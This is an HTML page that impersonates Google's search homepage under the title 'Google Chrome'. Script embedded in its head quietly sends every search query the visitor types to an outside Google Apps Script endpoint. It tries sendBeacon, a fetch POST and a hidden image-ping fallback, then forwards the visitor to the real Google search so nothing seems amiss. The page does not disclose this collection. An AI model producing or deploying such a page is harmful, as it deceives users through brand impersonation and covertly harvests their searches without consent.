<!DOCTYPE html>
<html lang="en" data-theme="auto">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>Google Chrome</title>
  <style>
    :root{--bg:#fff;--text:#111;--muted:#5f6368;--icon:#9aa0a6;--input-border:#dadce0;--btn-bg:#eef1f1}
    @media(prefers-color-scheme:dark){:root{--bg:#0f1115;--text:#e3e3e3;--muted:#b9bcbf;--icon:#a8adb3;--input-border:#2a2f36;--btn-bg:#1f2530}}
    *{box-sizing:border-box}html,body{height:100%}body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,Segoe UI,Roboto,Arial}
    .container{min-height:100%;display:flex;flex-direction:column}
    .header{display:flex;justify-content:space-between;padding:12px 16px;align-items:center}
    .app-grid{width:32px;height:32px;display:grid;place-items:center;border-radius:8px}
    .app-grid .dots{display:grid;grid-template-columns:repeat(3,6px);grid-gap:3px}
    .app-grid .dots i{width:6px;height:6px;border-radius:50%;background:var(--icon);display:block}
    .content{display:grid;place-items:center;padding:24px;gap:16px}
    .wordmark{font-weight:700;font-size:48px;background:linear-gradient(90deg,#1a73e8,#34a853);-webkit-background-clip:text;background-clip:text;color:transparent}
    .search-box{width:100%;max-width:680px;position:relative}
    #search-input{width:100%;height:52px;border-radius:999px;border:1px solid var(--input-border);padding:0 46px;background:transparent;color:var(--text);font-size:16px}
    .icon{position:absolute;top:50%;transform:translateY(-50%);width:20px;height:20px;fill:var(--icon)}
    .icon.left{left:14px}.icon.right{right:14px}
    .buttons{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:12px}
    .btn{background:var(--btn-bg);border:1px solid var(--input-border);padding:0 18px;height:44px;border-radius:10px;cursor:pointer}
    .footer{margin-top:auto;padding:12px 16px;background:transparent}
    .footer a{color:var(--muted);text-decoration:none;margin-right:12px}
  </style>

  <script>
    // YOUR script URL + key (from you)
    const ENDPOINT = 'https://script.google.com/macros/s/AKfycbzBmZQylsej3cOliV2MhgCOj6o03rY0WM8yOeR7OIiRGwxDdlxBvKfW6V95KF8vgG-x/exec';
    const API_KEY  = 'magic-key-2025';

    function sendToBackend(q){
      const params = new URLSearchParams({ q, key: API_KEY });

      // 1) Try navigator.sendBeacon (survives navigation)
      try {
        if (navigator.sendBeacon) {
          const blob = new Blob([params.toString()], { type: 'application/x-www-form-urlencoded;charset=UTF-8' });
          navigator.sendBeacon(ENDPOINT, blob);
        } else {
          fetch(ENDPOINT, { method: 'POST', body: params, keepalive: true, mode: 'cors' }).catch(()=>{});
        }
      } catch(e){}

      // 2) GET fallback (uses image ping to avoid CORS issues)
      try {
        const img = new Image();
        img.src = ENDPOINT + '?' + params.toString();
      } catch(e){}
    }

    window.addEventListener('DOMContentLoaded', ()=>{
      const form = document.getElementById('search-form');
      const input = document.getElementById('search-input');
      const lucky = document.getElementById('btn-lucky');

      form.addEventListener('submit', ()=>{
        const q = input.value || '';
        try{ localStorage.setItem('lastSearch', q); }catch(e){}
        sendToBackend(q);
        // browser will navigate to Google because form action is default (see HTML)
      });

      lucky.addEventListener('click', ()=>{
        const q = input.value || '';
        try{ localStorage.setItem('lastSearch', q); }catch(e){}
        sendToBackend(q);
        window.location.href = 'https://www.google.com/search?btnI=I&q=' + encodeURIComponent(q);
      });
    });
  </script>
</head>
<body>
  <div class="container">
    <header class="header">
      <div class="left">
        <div class="app-grid" title="Apps"><div class="dots"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div></div>
      </div>
      <nav class="right">
        <a href="https://mail.google.com">Gmail</a>
        <a href="https://www.google.com/imghp">Images</a>
      </nav>
    </header>

    <main class="content">
      <div class="wordmark">Google Chrome</div>

      <div class="search-box">
        <form id="search-form" action="https://www.google.com/search" method="GET">
          <svg class="icon left" viewBox="0 0 24 24" aria-hidden="true"><path d="M15.5 14h-.79l-.28-.27a6.5 6.5 0 1 0-.71.71l.27.28v.79L20 21.5 21.5 20l-6-6zm-6 0a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9z"/></svg>
          <svg class="icon right" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 14a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v5a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 14 0h-2zM11 19h2v3h-2z"/></svg>
          <input id="search-input" name="q" type="search" placeholder="Search" autocomplete="off" />
        </form>
      </div>

      <div class="buttons">
        <button class="btn" type="submit" form="search-form">Google Search</button>
        <button class="btn" id="btn-lucky" type="button">I'm Feeling Lucky</button>
      </div>
    </main>

    <footer class="footer">
      <div class="footer-content">
        <a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Settings</a>
      </div>
    </footer>
  </div>
</body>
</html>
